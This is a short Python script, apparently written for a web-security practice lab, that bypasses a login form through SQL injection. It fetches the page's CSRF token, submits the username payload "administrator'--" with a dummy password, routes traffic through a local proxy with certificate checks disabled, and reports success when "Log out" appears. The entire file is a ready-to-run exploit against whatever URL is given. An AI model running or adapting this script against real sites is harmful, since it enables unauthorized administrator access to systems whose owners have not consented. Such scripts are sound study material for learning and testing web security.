import requests
import urllib3
import sys
from bs4 import BeautifulSoup

#Disable warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Making request go through the proxy
proxy = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


#Exploit Function
def exploited_successfully(the_session, url, payload):
    csrf = get_csrf(the_session, url)
    creds = {"csrf": csrf, "username": payload,"password": "text"}
    request = the_session.post(url, data=creds, verify=False, proxies=proxy)
    #checking for text that should only exist if the exploit is successful
    if "Log out" in request.text:
        return True
    else:
        return False
    

#Getting csrf Function
def get_csrf(the_session, url):
    request = the_session.get(url, verify=False, proxies=proxy)
    extracted_text = BeautifulSoup(request.text, "html.parser")
    #looking for an input with a parameter of name="csrf" and taking its value
    csrf_token = extracted_text.find("input", {"name":"csrf"})["value"]
    return csrf_token


if __name__ == "__main__":
    #Making sure the user provides the url
    try:
        url = sys.argv[1].strip()
        payload = "administrator'--"
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <login-page-url>")
        sys.exit(-1)
    #Creating a session
    the_session = requests.Session()

    if exploited_successfully(the_session, url, payload):
        print("Successful")
    else:
        print("Something went wrong")